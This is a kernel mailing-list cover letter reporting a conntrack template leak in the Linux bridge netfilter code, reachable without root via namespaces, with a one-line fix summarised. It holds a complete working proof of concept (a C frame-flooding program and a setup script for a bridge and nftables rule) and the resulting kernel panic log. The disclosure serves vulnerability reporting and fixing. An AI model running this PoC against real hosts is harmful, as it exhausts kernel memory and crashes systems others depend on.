Received: from mail-pz2-f0.google.com (mail-pz2-f0.google.com [74.125.228.0])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D4CBC23394B
	for <bridge@lists.linux.dev>; Fri, 31 Jul 2026 06:37:07 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.0
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785479829; cv=none; b=fng3YPHwoWIGWR+UabobQ6wu6/iGZRi4xwsZ0EshmO8i2WVsYY08539RlqzZiK4JKfG7XmaWLhGgSWiyAwdrNRoR3ND0YTIH2g8mJEvsNHbaUEzc+/HmDZ7hPbSXngUZ1x1XHa0ew/JW38NPmSixFH0WWBJAtEsqs4L09Bkidr4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785479829; c=relaxed/simple;
	bh=s4pDVNKqKiJk4G+c0MMQo6wC6EPGJQu3YqGihkRDQ08=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=aso+RKRqAT1V1mKpkPcf9FEdbS8sLT8dkxrQx/F4wf2KQ0stu95cRCp/pTgMXNzUWVnagZ/4WOrEB6iYM/+3ch8U5UjPiLpQj5/e4wq01P1GzLOUxJsNklJ/obxwl3mJDk8Rd3eM8sWzHLiWl3hksClrkC14yUE/lv3SX0Sy3xE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Vr4kuDtV; arc=none smtp.client-ip=74.125.228.0
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Vr4kuDtV"
Received: by mail-pz2-f0.google.com with SMTP id 41be03b00d2f7-c888c001628so335204a12.0
        for <bridge@lists.linux.dev>; Thu, 30 Jul 2026 23:37:07 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785479827; x=1786084627; darn=lists.linux.dev;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=Yy7fkwWkkFUoC/alRV/ujwHTJ1l1BB4QsbRaiT9RzSw=;
        b=Vr4kuDtVKBup1KhpS7V1Cb6shYsiTjy8drrpyZqPkCqb3wD6ow7UJhA86mH7CSwHU8
         9wjnj4sNBxheY9ChHim5TBrLb/3rqWzb98mfvNd1i2qHckroZ0bZCvZClriR/+PrX5Hw
         etX39Zc0UWswyTm2EG2b7/7QFWTfdDgG8eU9gHrj4wiL0bpeV/+yfl56AXhjwBNqqxu0
         tObVZAq5DqqrbGIryQ/WCClhvogs/T3TJtj9SNKZPhQ3XI7E7Us4CMAg9rqzE9okwZcI
         R4LXimxz68ncIaq8ysetLycq+kudOync709gKEQtlc8WSDqnWs8i1/ysvQhYOaZ6itPi
         EOzQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785479827; x=1786084627;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Yy7fkwWkkFUoC/alRV/ujwHTJ1l1BB4QsbRaiT9RzSw=;
        b=jpEam49TDQ+zulwp4oyZJIHl5V2rcqEsRt+MwYzdxjkYtJu0fiMkTNCVRJfclbdnLm
         lLSNBXk50uZorsqC0MOkjdbo/qtQ+esR0c1xQbxNS6DcaF2TsOko9MAQhEu4IIxVFnGC
         DeLRm0aC41PBVht+AyHZ3hiGR+l83LbTIspzPNL1bzFcI2EphA4ezQX4KFVHTlnza5jQ
         U7w479lfdy2dIjw4pi3tdYSiH8k1ijUFgZtHfN6MJWTckthNhg3O/QVVR/G92bcoPgfK
         RNSEqJPb1xIJ7E/oZeEgKtvFLnT/ggvcDRvWDnXfYTD9RQwOpw0kK7QbEqYCBHzrIP5q
         nksg==
X-Forwarded-Encrypted: i=1; AHgh+RoUQMqaxjsnrY1VPOsqtiYEI0eYFBXhX28xLlHE91JOT+JsuKCKLKcQjq5UZ2zXuVLV6lRkHUA=@lists.linux.dev
X-Gm-Message-State: AOJu0Yzv0tL1sspMH3LALb3Z9NXewAT7y2jPeT2/NX726F9AwEvKBpyq
	CZG+nVstC48t7RmWcQnt/75yJTo1MTsfOAn5CUTPqwRJgcidg+X1zSrGR4VYa1Mrb/z6ILXLCsZ
	+pLfKOCSp2IVUMA==
X-Gm-Gg: AR+sD13PHoBdjdQR7Tay8om5B75EfOfFGf9rhZ2xkpobldHLMfP+FZU4rr0q+1diqqz
	Xip89IKsRwSQ2TEgqevdjeQ2HqpzVKsD9U7oLNwPpECneRr07JE4YkbrFlb72vBl22Jkir/1JNR
	wjU98UFrVj3qnPCvXSWt7PqagD36F+xdoa4oy8woPHW7+YvfqW/D72KL2KZUzrxHH5MPrMy2Tb5
	oqdIsbmFzyv7ShuBaHiNpDVwTTAQPhG0NzCAPfDjNbFchjEMJXMRyizemXfwOZ92EW9H0G8ReXM
	yMykkwBaGYNVGDr1YhauzZ2LeoGpf63lyrau2gJSuOe8ohfiWztuaOGBE8HNCDGz5Y5uaXGlRDe
	4DgjX2Ukh+dVxzWim1x60ewrMsSZtdVSwmwRJqGpN5BO+i07+Uo0+a3vq+29G7mZzHQgopIdhuB
	a+2zuynZPNtVhm46LA68pScQEpZFTco9EYmWBm7ZlPnbevhDkdcueGHRGB3pleGLXRvFhGdW2dz
	JTf
X-Received: by 2002:a05:6a00:2e93:b0:84e:d51d:86cd with SMTP id d2e1a72fcca58-84ed7153224mr759089b3a.45.1785479827044;
        Thu, 30 Jul 2026 23:37:07 -0700 (PDT)
Received: from Roxy.localdomain ([203.175.14.58])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84edc2d7b97sm6102b3a.43.2026.07.30.23.37.02
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 30 Jul 2026 23:37:05 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netfilter-devel@vger.kernel.org,
	bridge@lists.linux.dev,
	netdev@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	razor@blackwall.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: bridge: release template ct on non-IP path
Date: Fri, 31 Jul 2026 14:36:52 +0800
Message-ID: <cover.1785479514.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: bridge@lists.linux.dev
List-Id: <bridge.lists.linux.dev>
List-Subscribe: <mailto:bridge+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:bridge+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in
net/bridge/netfilter/nf_conntrack_bridge.c. The bug is reachable by a
non-root user via user and net namespace.

We've built the fix locally, and it should not affect normal
functionality.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

A bridge nftables ct zone set rule can attach a conntrack template to an
skb before nf_ct_bridge_pre() sees it. For non-IPv4 and non-IPv6
EtherTypes, nf_ct_bridge_pre() marks the frame untracked without first
dropping the existing template reference.

That makes the per-cpu template, and any temporary templates allocated
for concurrent use, unreachable. Repeated non-IP bridge traffic can
therefore leak unreclaimable slab memory until the host hits OOM.

Reproducer:

    make
    chmod +x poc.sh
    THREADS=4 ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

// SPDX-License-Identifier: MIT
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

struct worker_cfg {
	int ifindex;
	int cpu;
	uint16_t ethertype;
};

static volatile sig_atomic_t stop_flag;
static atomic_ullong total_sent;

static void handle_signal(int sig)
{
	(void)sig;
	stop_flag = 1;
}

static unsigned int online_cpus(void)
{
	long n = sysconf(_SC_NPROCESSORS_ONLN);

	return n > 0 ? (unsigned int)n : 1U;
}

static int pin_to_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
}

static void build_frame(unsigned char *frame, size_t len, int cpu, uint16_t ethertype)
{
	size_t i;

	memset(frame, 0, len);
	memset(frame, 0xff, ETH_ALEN);
	frame[6] = 0x02;
	frame[7] = 0x11;
	frame[8] = 0x22;
	frame[9] = 0x33;
	frame[10] = 0x44;
	frame[11] = (unsigned char)cpu;
	frame[12] = (unsigned char)(ethertype >> 8);
	frame[13] = (unsigned char)(ethertype & 0xff);

	for (i = ETH_HLEN; i < len; i++)
		frame[i] = (unsigned char)(cpu + i);
}

static void *worker(void *arg)
{
	static const size_t frame_len = ETH_ZLEN;
	struct worker_cfg *cfg = arg;
	struct sockaddr_ll sll = {
		.sll_family = AF_PACKET,
		.sll_ifindex = cfg->ifindex,
		.sll_halen = ETH_ALEN,
		.sll_protocol = htons(cfg->ethertype),
	};
	unsigned char frame[ETH_ZLEN];
	uint64_t local = 0;
	int fd;
	int one = 1;

	memset(sll.sll_addr, 0xff, ETH_ALEN);
	build_frame(frame, sizeof(frame), cfg->cpu, cfg->ethertype);

	fd = socket(AF_PACKET, SOCK_RAW, htons(cfg->ethertype));
	if (fd < 0) {
		perror("socket(AF_PACKET)");
		return NULL;
	}

	(void)setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
	(void)pin_to_cpu(cfg->cpu);

	while (!stop_flag) {
		ssize_t ret;

		ret = sendto(fd, frame, frame_len, 0, (struct sockaddr *)&sll,
			     sizeof(sll));
		if (ret == (ssize_t)frame_len) {
			local++;
			if ((local & ((1U << 12) - 1)) == 0)
				atomic_fetch_add_explicit(&total_sent, 1U << 12,
							  memory_order_relaxed);
			continue;
		}

		if (ret < 0 &&
		    (errno == EINTR || errno == ENOBUFS || errno == EBUSY ||
		     errno == ENETDOWN || errno == ENXIO))
			continue;

		if (ret < 0)
			perror("sendto");
		break;
	}

	if (local & ((1U << 12) - 1))
		atomic_fetch_add_explicit(&total_sent,
					  local & ((1U << 12) - 1),
					  memory_order_relaxed);
	close(fd);
	return NULL;
}

static unsigned long parse_ul(const char *s, unsigned long defval, int base)
{
	char *end = NULL;
	unsigned long v;

	if (!s)
		return defval;

	errno = 0;
	v = strtoul(s, &end, base);
	if (errno || !end || *end != '\0')
		return defval;

	return v;
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s <ifname> [threads] [ethertype] [seconds]\n"
		"Defaults: threads=<online cpus>, ethertype=0x88b5, seconds=0 (run until killed)\n",
		prog);
}

int main(int argc, char **argv)
{
	struct sigaction sa = { .sa_handler = handle_signal };
	const char *ifname;
	unsigned int threads;
	unsigned int i;
	unsigned long seconds;
	uint16_t ethertype;
	int ifindex;
	pthread_t *tids;
	struct worker_cfg *cfgs;
	time_t start;

	if (argc < 2) {
		usage(argv[0]);
		return 1;
	}

	ifname = argv[1];
	ifindex = if_nametoindex(ifname);
	if (!ifindex) {
		perror("if_nametoindex");
		return 1;
	}

	threads = (unsigned int)parse_ul(argv[2], online_cpus(), 10);
	if (!threads)
		threads = 1;

	ethertype = (uint16_t)parse_ul(argv[3], 0x88b5, 0);
	seconds = parse_ul(argv[4], 0, 10);

	tids = calloc(threads, sizeof(*tids));
	cfgs = calloc(threads, sizeof(*cfgs));
	if (!tids || !cfgs) {
		perror("calloc");
		free(tids);
		free(cfgs);
		return 1;
	}

	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;
	if (sigaction(SIGINT, &sa, NULL) || sigaction(SIGTERM, &sa, NULL)) {
		perror("sigaction");
		free(tids);
		free(cfgs);
		return 1;
	}

	start = time(NULL);
	fprintf(stderr,
		"Starting sender on %s (ifindex=%d), threads=%u, ethertype=0x%04x, seconds=%lu\n",
		ifname, ifindex, threads, ethertype, seconds);

	for (i = 0; i < threads; i++) {
		cfgs[i].ifindex = ifindex;
		cfgs[i].cpu = (int)(i % online_cpus());
		cfgs[i].ethertype = ethertype;
		if (pthread_create(&tids[i], NULL, worker, &cfgs[i]) != 0) {
			perror("pthread_create");
			stop_flag = 1;
			threads = i;
			break;
		}
	}

	while (!stop_flag) {
		sleep(1);
		fprintf(stderr, "elapsed=%lds total_sent=%llu\n",
			(long)(time(NULL) - start),
			(unsigned long long)atomic_load_explicit(&total_sent,
							      memory_order_relaxed));
		if (seconds && (unsigned long)(time(NULL) - start) >= seconds)
			stop_flag = 1;
	}

	for (i = 0; i < threads; i++)
		pthread_join(tids[i], NULL);

	fprintf(stderr, "final total_sent=%llu\n",
		(unsigned long long)atomic_load_explicit(&total_sent,
						      memory_order_relaxed));
	free(tids);
	free(cfgs);
	return 0;
}

------END poc.c--------

------BEGIN poc.sh------

#!/bin/bash
set -euo pipefail

THREADS="${THREADS:-$(nproc)}"
ETHERTYPE="${ETHERTYPE:-0x88b5}"
SECONDS_TO_RUN="${SECONDS_TO_RUN:-0}"
BR_DEV="${BR_DEV:-br_ctleak}"
BR_PORT="${BR_PORT:-vport0}"
INJECT_DEV="${INJECT_DEV:-inj0}"
NFT_TABLE="${NFT_TABLE:-ctleak}"

cleanup() {
	set +e
	if [[ -n "${MONITOR_PID:-}" ]]; then
		kill "${MONITOR_PID}" 2>/dev/null
		wait "${MONITOR_PID}" 2>/dev/null
	fi
	nft delete table bridge "${NFT_TABLE}" 2>/dev/null
	ip link del "${BR_PORT}" 2>/dev/null
	ip link del "${INJECT_DEV}" 2>/dev/null
	ip link del "${BR_DEV}" 2>/dev/null
}

monitor() {
	while true; do
		awk '
			/^(MemAvailable|Slab|SReclaimable|SUnreclaim):/ {
				printf "%s=%s%s ", $1, $2, $3
			}
			$1 == "nf_conntrack" {
				printf "nf_conntrack_active=%s nf_conntrack_total=%s objsize=%s\n",
				       $2, $3, $4
			}
		' /proc/meminfo /proc/slabinfo
		sleep 1
	done
}

if [[ "$(id -u)" -ne 0 ]]; then
	echo "Run as root." >&2
	exit 1
fi

trap cleanup EXIT

sysctl -q -w kernel.panic_on_warn=0
sysctl -q -w vm.panic_on_oom=2

nft delete table bridge "${NFT_TABLE}" 2>/dev/null || true
ip link del "${BR_PORT}" 2>/dev/null || true
ip link del "${INJECT_DEV}" 2>/dev/null || true
ip link del "${BR_DEV}" 2>/dev/null || true

ip link add "${BR_DEV}" type bridge
ip link add "${BR_PORT}" type veth peer name "${INJECT_DEV}"
ip link set "${BR_PORT}" master "${BR_DEV}"
ip link set "${BR_DEV}" up
ip link set "${BR_PORT}" up
ip link set "${INJECT_DEV}" up

nft add table bridge "${NFT_TABLE}"
nft "add chain bridge ${NFT_TABLE} preraw { type filter hook prerouting priority -300; policy accept; }"
nft "add rule bridge ${NFT_TABLE} preraw ct zone set 1"

echo "Bridge ruleset:"
nft list table bridge "${NFT_TABLE}"
echo "Initial nf_conntrack slab:"
grep '^nf_conntrack ' /proc/slabinfo || true

monitor &
MONITOR_PID=$!

if [[ ! -x ./poc ]]; then
	make
fi

./poc "${INJECT_DEV}" "${THREADS}" "${ETHERTYPE}" "${SECONDS_TO_RUN}"

------END poc.sh--------

----BEGIN crash log----

[  910.646493][T11638] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[  910.647249][T11638] CPU: 3 UID: 0 PID: 11638 Comm: sshd-session Not tainted 6.12.95 #2
[  910.647787][T11638] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  910.648584][T11638] Call Trace:
[  910.648818][T11638]  <TASK>
[  910.649025][T11638]  panic (build/../kernel/panic.c:108)
[  910.649301][T11638]  ? dump_header (build/../mm/oom_kill.c:164 build/../mm/oom_kill.c:384 build/../mm/oom_kill.c:438 build/../mm/oom_kill.c:474)
[  910.649617][T11638]  ? __pfx_panic (build/../kernel/panic.c:740)
[  910.649968][T11638]  out_of_memory (build/../mm/oom_kill.c:292 build/../mm/oom_kill.c:1140)
[  910.650302][T11638]  ? __alloc_pages_noprof (build/../mm/page_alloc.c:5168)
[  910.650685][T11638]  ? __pfx_out_of_memory (build/../mm/oom_kill.c:835)
[  910.651025][T11638]  ? lock_acquire (build/../kernel/locking/lockdep.c:5828)
[  910.651329][T11638]  ? __alloc_pages_noprof (build/../mm/page_alloc.c:5168)
[  910.651714][T11638]  __alloc_pages_noprof (build/../mm/page_alloc.c:5709 (discriminator 1))
[  910.652151][T11638]  ? hlock_class+0x4e/0x130
[  910.652516][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  910.652986][T11638]  ? __lock_acquire (build/../kernel/locking/lockdep.c:3760 build/../kernel/locking/lockdep.c:3855 build/../kernel/locking/lockdep.c:3876 build/../kernel/locking/lockdep.c:5237)
[  910.653387][T11638]  ? __pfx___alloc_pages_noprof (build/../include/linux/signal.h:87)
[  910.653878][T11638]  ? __pfx___lock_acquire (build/../kernel/locking/lockdep.c:4397 (discriminator 11))
[  910.654307][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  910.654770][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  910.655212][T11638]  ? find_held_lock (build/../kernel/locking/lockdep.c:5350 (discriminator 1))
[  910.655608][T11638]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  910.656060][T11638]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[  910.657215][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  910.657683][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  910.658137][T11638]  ? xas_load (build/../include/linux/xarray.h:1293 (discriminator 1) build/../lib/xarray.c:211 (discriminator 1) build/../lib/xarray.c:246 (discriminator 1))
[  910.658493][T11638]  ? filemap_get_entry (build/../include/linux/rcupdate.h:836 build/../mm/filemap.c:1898)
[  910.658922][T11638]  folio_alloc_noprof (build/../mm/mempolicy.c:2591)
[  910.659310][T11638]  filemap_alloc_folio_noprof (build/../mm/filemap.c:1211)
[  910.659750][T11638]  ? __pfx_filemap_alloc_folio_noprof (build/../include/linux/seqlock.h:228 (discriminator 2))
[  910.660262][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  910.660727][T11638]  __filemap_get_folio+0x35b/0x7a0
[  910.661152][T11638]  filemap_fault (build/../mm/filemap.c:3470 build/../mm/filemap.c:3547)
[  910.661525][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  910.661916][T11638]  ? __pfx_filemap_fault (build/../arch/x86/include/asm/bitops.h:202 (discriminator 1))
[  910.662291][T11638]  ? __pfx_lock_release (build/../kernel/locking/lockdep.c:238 (discriminator 9))
[  910.662648][T11638]  __do_fault (build/../mm/memory.c:5458)
[  910.662956][T11638]  do_pte_missing+0x10c9/0x3710
[  910.663291][T11638]  ? pte_offset_map_nolock+0x7a/0x170
[  910.663679][T11638]  __handle_mm_fault (build/../include/linux/huge_mm.h:303 (discriminator 1) build/../mm/memory.c:6476 (discriminator 1))
[  910.664035][T11638]  ? __pfx_lock_release (build/../kernel/locking/lockdep.c:238 (discriminator 9))
[  910.664371][T11638]  ? down_read_trylock (build/../kernel/locking/rwsem.c:1613 (discriminator 1) build/../kernel/locking/rwsem.c:1607 (discriminator 1))
[  910.664732][T11638]  ? lock_vma_under_rcu (build/../include/linux/err.h:92 (discriminator 1) build/../mm/mmap_lock.c:311 (discriminator 1))
[  910.665081][T11638]  ? __pfx___handle_mm_fault (build/../mm/memory.c:4710)
[  910.665470][T11638]  ? rcu_is_watching (build/../include/linux/context_tracking.h:128 (discriminator 1) build/../kernel/rcu/tree.c:752 (discriminator 1))
[  910.665803][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  910.666194][T11638]  handle_mm_fault (build/../mm/memory.c:6710)
[  910.666530][T11638]  do_user_addr_fault (build/../include/linux/mm.h:1538 (discriminator 1) build/../arch/x86/include/asm/mmu_context.h:271 (discriminator 1) build/../arch/x86/mm/fault.c:1079 (discriminator 1) build/../arch/x86/mm/fault.c:1329 (discriminator 1))
[  910.666901][T11638]  exc_page_fault (build/../arch/x86/mm/fault.c:1471 (discriminator 2) build/../arch/x86/mm/fault.c:1527 (discriminator 2))
[  910.667220][T11638]  asm_exc_page_fault (build/../arch/x86/include/asm/idtentry.h:618)
[  910.667551][T11638] RIP: 0033:0x55e87d072fe9
[  910.667868][T11638] Code: Unable to access opcode bytes at 0x55e87d072fbf.

Code starting with the faulting instruction
===========================================
[  910.668333][T11638] RSP: 002b:00007fff829343c0 EFLAGS: 00010206
[  910.668750][T11638] RAX: 0000000000000001 RBX: 000055e89bfa1840 RCX: 000055e87d0d3866
[  910.669274][T11638] RDX: 0000000000000000 RSI: 0000000000000004 RDI: 000055e89bfafbf0
[  910.669803][T11638] RBP: 00007fff82934410 R08: 0000000000000008 R09: 0000000000000000
[  910.670324][T11638] R10: 00007fff829344a0 R11: 0000000000000202 R12: 0000000000000000
[  910.670859][T11638] R13: 00007fff829344a0 R14: 000000000000038d R15: 0000000000000007
[  910.671409][T11638]  </TASK>
[  910.671825][T11638] Kernel Offset: disabled
[  910.672195][T11638] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  netfilter: bridge: release template ct on non-IP path

 net/bridge/netfilter/nf_conntrack_bridge.c | 1 +
 1 file changed, 1 insertion(+)

-- 
2.43.0

